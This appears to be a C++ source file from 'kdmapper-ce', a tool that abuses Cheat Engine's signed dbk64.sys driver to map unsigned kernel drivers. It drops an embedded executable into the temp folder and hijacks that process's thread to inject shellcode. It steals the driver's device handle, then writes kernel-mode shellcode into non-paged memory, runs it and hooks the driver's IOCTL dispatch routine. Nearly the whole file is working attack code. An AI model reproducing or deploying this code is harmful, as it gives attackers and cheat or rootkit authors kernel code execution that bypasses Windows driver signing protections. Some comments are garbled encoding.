#include "kdmapper_ce.hpp"
UINT64 pMmGetSystemRoutineAddress = NULL;
UINT64 pIofCompleteRequest = NULL;

HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {

    HANDLE result = INVALID_HANDLE_VALUE;

    // drop kernelmoduleunloader.exe into the %temp% folder

    std::wstring UnloaderPath = utils::GetFullTempPath() + L"\\" + L"Kernelmoduleunloader.exe";
    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe", kernelmoduleunloader_resource::kernelmoduleunloader, sizeof(kernelmoduleunloader_resource::kernelmoduleunloader));

    // adjust process token

    BOOL bRet = FALSE;
    HANDLE hToken = NULL;
    LUID luid = { 0 };

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        {
            TOKEN_PRIVILEGES tokenPriv = { 0 };
            tokenPriv.PrivilegeCount = 1;
            tokenPriv.Privileges[0].Luid = luid;
            tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
    }
    if (!bRet) {
        Error("RtlAdjustPrivilege failed");
        return result;
    }

    // kernelmoduleunloader�v���Z�X���쐬

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // TODO: hide kernelmoduleunloader's popup

    if (!CreateProcess(NULL,
        (LPWSTR)UnloaderPath.c_str(),
        NULL,
        NULL,
        TRUE,          // bInheritHandles: Because shellcode requires SE_PRIVILEGE_ENABLED
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi))
    {
        Error("CreateProcess failed 0x%x", GetLastError());
        return result;
    }

    result = pi.hProcess;
    //CloseHandle(pi.hThread);
    //CloseHandle(pi.hProcess);
    return result;
}

HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {

    // kernelmoduleunloader.exe process �̃X���b�h��hijack

    HANDLE hDevice = INVALID_HANDLE_VALUE;
    HANDLE threadHijacked = NULL;
    HANDLE targetThread = NULL;
    HANDLE snapshot;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    DWORD targetProcessID = GetProcessId(hTargetProcess);

    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(snapshot, &threadEntry);

    while (Thread32Next(snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == targetProcessID)
        {

#ifdef _DEBUG
            Log("kdmapper-ce.exe processID:%d TargetThreadID:%d", threadEntry.th32OwnerProcessID, threadEntry.th32ThreadID);
#endif // _DEBUG

            targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    if (targetThread == NULL) {
        Error("OpenThread failed");
        return hDevice;
    }

    // inject shellcode

    SIZE_T shellcode_size = sizeof shellcode_resource::shellcode;

    HANDLE remoteShellcodeBuffer = VirtualAllocEx(hTargetProcess, NULL, shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteShellcodeBuffer == NULL) {
        Error("VirtualAllocEx failed");
        return hDevice;
    }

    WriteProcessMemory(hTargetProcess, remoteShellcodeBuffer, shellcode_resource::shellcode, shellcode_size, NULL);

    // hijack the main thread of kernelmoduleunloader

    WOW64_CONTEXT ct32;
    ZeroMemory(&ct32, sizeof(PWOW64_CONTEXT));

    Wow64SuspendThread(targetThread);

    ct32.ContextFlags = CONTEXT_CONTROL;
    Wow64GetThreadContext(targetThread, &ct32);

    ct32.Eip = (DWORD)remoteShellcodeBuffer;

    Wow64SetThreadContext(targetThread, &ct32);
    ResumeThread(targetThread);

    Sleep(1000); // 1s

    // pattern��kernelmoduleunloader�̃v���Z�X���������X�L����

    MEMORY_PATTERN  pattern = { 0x12345678, NULL, 0x12345678 };

    MEMORY_PATTERN* tmp_pattern = (MEMORY_PATTERN*)SearchMemoryForPattern(
        hTargetProcess,
        pattern,
        PAGE_READWRITE,
        MEM_COMMIT,
        MEM_PRIVATE
    );

#ifdef _DEBUG
    //Log("%x, %d, %x", tmp_pattern->marks, tmp_pattern->handle, tmp_pattern->marks2);
#endif // DEBUG

    if (tmp_pattern->marks == 0x12345678 && tmp_pattern->marks2 == 0x12345678) {
        hDevice = (HANDLE)tmp_pattern->handle;
    }

    return hDevice;
}

LPVOID kdmapper_ce::SearchMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN pattern, DWORD flProtect, DWORD flAllocationType, DWORD flType) {

    LPVOID offset = 0;
    LPVOID lpBuffer = NULL;
    MEMORY_BASIC_INFORMATION mbi = {};

    lpBuffer = VirtualAlloc(NULL, sizeof(MEMORY_PATTERN), MEM_COMMIT, PAGE_READWRITE);
    if (lpBuffer == NULL) {
        Error("VirtualAlloc failed");
        return NULL;
    }

#ifdef _DEBUG
    //printf("BaseAddress");
    //printf("\tRegionSize");
    //printf("\tProtect");
    //printf("\tState");
    //printf("\tType\n");
#endif // _DEBUG

    while (VirtualQueryEx(hProcess, offset, &mbi, sizeof(mbi)))
    {

#ifdef _DEBUG
        //printf("0x%llx", mbi.BaseAddress);
        //printf("\t%llx", mbi.RegionSize);
        //printf("\t%lx", mbi.AllocationProtect);
        //printf("\t%lx", mbi.State);
        //printf("\t%lx\n", mbi.Type);
#endif // _DEBUG

        // Compare patterns

        ReadProcessMemory(hProcess, mbi.BaseAddress, lpBuffer, sizeof(MEMORY_PATTERN), NULL);
        SIZE_T res = RtlCompareMemory(lpBuffer, (const void*)&pattern, sizeof(MEMORY_PATTERN));

        if (mbi.AllocationProtect == flProtect && mbi.State == flAllocationType && mbi.Type == flType && res != (SIZE_T)0)
        {
            Log("Pattern found at 0x%x (match pattern count: 0x%d)", mbi.BaseAddress, res);
            break;
        }

        if (mbi.BaseAddress > (PVOID)0x7fffffff)
        {
            Error("Scan error: No pattern found");
            break;
        }

        offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    return lpBuffer;
}


HANDLE kdmapper_ce::GetDbk64DeviceHandle()
{
    HANDLE hDbk64 = INVALID_HANDLE_VALUE;
    HANDLE hKernelModuleUnloader = INVALID_HANDLE_VALUE;

    hKernelModuleUnloader = CreateKernelModuleUnloaderProcess();
    if (hKernelModuleUnloader == INVALID_HANDLE_VALUE) {
        Error("CreateKernelModuleUnloaderProcess failed");
        return hDbk64;
    }

    // drop kernelmoduleunloader.exe.sig into the %temp% folder

    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe.sig", kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig, sizeof(kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig));

    // Inject the shellcode into the KernelModuleUnloader.exe process to get the device handle of dbk64.sys.

    HANDLE hOriginalDbk64 = GetDbk64DeviceHandleByInjection(hKernelModuleUnloader);
    if (hOriginalDbk64 == INVALID_HANDLE_VALUE || hOriginalDbk64 == NULL || hOriginalDbk64 == (HANDLE)0xffffffff) {
        Error("GetDbk64DeviceHandleByInjection failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    // Convert a handle obtained by kernelmoduleunloader into a handle that can be used by kdmapper-ce

    if (!DuplicateHandle(hKernelModuleUnloader, hOriginalDbk64, GetCurrentProcess(), &hDbk64, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
        Error("DuplicateHandle failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    Log("Duplicated Dbk64.sys handle: 0x%d (original: 0x%d)", hDbk64, hOriginalDbk64);

    // Close process and process handles. 

    TerminateProcess(hKernelModuleUnloader, 0);
    CloseHandle(hKernelModuleUnloader);

    return hDbk64;
}


BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS* exitCode)
{
    BOOL status = FALSE;

    do {

        // DeviceIoControlTest
#ifdef _DEBUG
        if (!Dbk64HookedDeviceIoControlTest(dbk64_device_handle, L"MmGetSystemRoutineAddress")) {
            Error("DeviceIoControlTest failed");
            return FALSE;
        }
#endif // _DEBUG

    } while (FALSE);

    return status;

}

bool kdmapper_ce::CreateDriverObject(HANDLE hDevice, UINT64 EntryPoint, PCWSTR driverName) {

    auto ioCtlCode = IOCTL_CREATE_DRIVER;
    DWORD returned;
    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 DriverInitialize;
        UINT64 driverName;
    } inp = {
        pMmGetSystemRoutineAddress,
        EntryPoint,
        (UINT64)driverName
    };

    if (DeviceIoControl(hDevice, ioCtlCode, &inp, sizeof input, nullptr, 0, &returned, nullptr))
        return TRUE;
    else
        return FALSE;

}

PVOID kdmapper_ce::Dbk64HookedDeviceIoControlTest(HANDLE hDevice, PCWSTR functionName) {

    auto ioCtlCode = IOCTL_GETPROCADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;
    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);
   
    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 functionName;
    } inp = { pMmGetSystemRoutineAddress, pIofCompleteRequest, (UINT64)functionName };


    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    if (bRc)
        return (PVOID)inp.MmGetSystemRoutineAddress;
    else
        return NULL;
}

PVOID kdmapper_ce::GetSystemProcAddressAddress(HANDLE hDevice) {
    /*
    auto ioCtlCode = IOCTL_GETPROCADDRESS_ADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
    } inp = { NULL };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    return (PVOID)inp.MmGetSystemRoutineAddress;
    */
    return (PVOID)pMmGetSystemRoutineAddress;
}

PVOID kdmapper_ce::GetSystemProcAddress(HANDLE hDevice, PCWSTR functionName) {
    auto ioCtlCode = IOCTL_GETPROCADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;
    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 functionName;
    } inp = { pMmGetSystemRoutineAddress, (UINT64)functionName };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    if (bRc)
        return (PVOID)inp.MmGetSystemRoutineAddress;
    else
        return FALSE;
}

BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
{

    BOOL bRc = FALSE;
    SIZE_T shellcodeSize = sizeof(kernel_mode_shellcode_resource::kernel_mode_shellcode);
    VOID* shellcode = (VOID*)kernel_mode_shellcode_resource::kernel_mode_shellcode;
    SIZE_T shellcodeIoctlSize = sizeof(kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl);
    VOID* shellcodeIoctl = (VOID*)kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl;

    do {

        pMmGetSystemRoutineAddress = (UINT64)ce_driver::CEGetSystemProcAddress(dbk64_device_handle, L"MmGetSystemRoutineAddress");
        pIofCompleteRequest = (UINT64)ce_driver::CEGetSystemProcAddress(dbk64_device_handle, L"IofCompleteRequest");

        // IRP_MJ_DEVICE_CONTROLのHook

        // IOCTL_ALLOCATEMEM_NONPAGEDで非ページプールにメモリを確保

        UINT64 kernelShellcodeBuf = ce_driver::AllocateNonPagedMem(dbk64_device_handle, shellcodeSize);
        if (kernelShellcodeBuf == NULL) {
            Error("AllocateNoPagedMem failed");
            break;
        }

        Log("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);

        // 上で確保したバッファのMDL を作成し，ユーザー空間からアクセス可能にする

        UINT64 shellcodeBuf = NULL;
        UINT64 Mdl = NULL;

        if (!ce_driver::CreateSharedMemory(dbk64_device_handle, kernelShellcodeBuf, &shellcodeBuf, &Mdl, shellcodeSize)) {
            Error("CreateSharedMemory failed");
            break;
        }

        Log("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", shellcodeBuf, Mdl);


        // 共有メモリにカーネルモードシェルコードを書き込み

        memcpy((void*)shellcodeBuf, shellcode, shellcodeSize);

        // ユーザー空間に割り当てたメモリのアンマップ

        if (!ce_driver::UnMapSharedMemory(dbk64_device_handle, shellcodeBuf, Mdl)) {
            Error("UnMapSharedMemory failed");
            break;
        }

        // シェルコードの引数を準備
        // Change per PIS

        UINT64 ioctlShellcodeBuf = ce_driver::AllocateNonPagedMem(dbk64_device_handle, shellcodeIoctlSize);
        UINT64 ioctlSharedBuf = NULL;
        UINT64 Mdl1_2 = NULL;
        if (!ce_driver::CreateSharedMemory(dbk64_device_handle, ioctlShellcodeBuf, &ioctlSharedBuf, &Mdl1_2, shellcodeIoctlSize)) {
            Error("CreateSharedMemory failed");
            break;
        }

        Log("Shared memory for shellcode param has been created in user space at 0x%p (MDL: 0x%p)", ioctlSharedBuf, Mdl1_2);

        memcpy((void*)ioctlSharedBuf, shellcodeIoctl, shellcodeIoctlSize);

        if (!ce_driver::UnMapSharedMemory(dbk64_device_handle, ioctlSharedBuf, Mdl1_2)) {
            Error("UnMapSharedMemory failed");
            break;
        }

        struct KernelPisParameters
        {
            LPVOID MmGetSystemRoutineAddress;
            LPVOID HookFunctionAddress;
            USHORT dummy2;
        } pisParameters = {
            GetSystemProcAddressAddress(dbk64_device_handle),
            (LPVOID)ioctlShellcodeBuf,
            NULL
        };

        UINT64 kernelParamAddr = ce_driver::AllocateNonPagedMem(dbk64_device_handle, sizeof(KernelPisParameters));
        UINT64 sharedParamBuf = NULL;
        UINT64 Mdl2 = NULL;

        if (!ce_driver::CreateSharedMemory(dbk64_device_handle, kernelParamAddr, &sharedParamBuf, &Mdl2, sizeof(KernelPisParameters))) {
            Error("CreateSharedMemory failed");
            break;
        }

        Log("Shared memory for shellcode param has been created in user space at 0x%p (MDL: 0x%p)", sharedParamBuf, Mdl2);

        memcpy((void*)sharedParamBuf, (void*)&pisParameters, sizeof(KernelPisParameters));

        if (!ce_driver::UnMapSharedMemory(dbk64_device_handle, sharedParamBuf, Mdl2)) {
            Error("UnMapSharedMemory failed");
            break;
        }

        // カーネルモードシェルコードの実行しパッチを当てる

        UINT64 shellcodeAddress = kernelShellcodeBuf;
        UINT64 shellcodeParam = kernelParamAddr;
        if (!ce_driver::ExecuteKernelModeShellCode(dbk64_device_handle, shellcodeAddress, shellcodeParam)) {
            Error("ExecuteKernelModeShellCode failed");
            break;
        }

        // Hooked DeviceIoControlTest
#ifdef _DEBUG
        //if (!Dbk64DeviceIoControlTest(dbk64_device_handle)) {
        //    Error("DeviceIoControlTest failed");
        //    return FALSE;
        //}
#endif // _DEBUG

        bRc = TRUE;

    } while (false);

    return bRc;
}

bool kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_imports imports) {
    for (const auto& current_import : imports) {

        /*ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
        if (!Module) {
#if !defined(DISABLE_OUTPUT)
            Log("Dependency %s wasn't found", current_import.module_name);
#endif
            return false;
        }*/
        for (auto& current_function_data : current_import.function_datas) {
            //uint64_t function_address = GetKernelModuleExport(hDevice, Module, current_function_data.name);
            //TODO:
            // ����ntoskrnl�̂ݑΉ�
            std::wstring function_name(current_function_data.name.begin(), current_function_data.name.end());
            uint64_t function_address = (uint64_t)GetSystemProcAddress(hDevice, function_name.c_str());

            //uint64_t function_address = MmGetSystemRoutineAddress(hDevice, current_function_data.name);
            Log("ResolveImports: import %ls (0x%p)", function_name.c_str(), function_address);
            //            if (!function_address) {
            //                //Lets try with ntoskrnl
            //                if (Module != ntoskrnlAddr) {
            //                    function_address = GetKernelModuleExport(hDevice, ntoskrnlAddr, current_function_data.name);
            //                    if (!function_address) {
            //#if !defined(DISABLE_OUTPUT)
            //                        Log("Failed to resolve import %s (%s)", current_function_data.name, current_import.module_name);
            //#endif
                                    //return false;
                               // }
                            //}
                        //}

            * current_function_data.address = function_address;
        }
    }

    return true;
}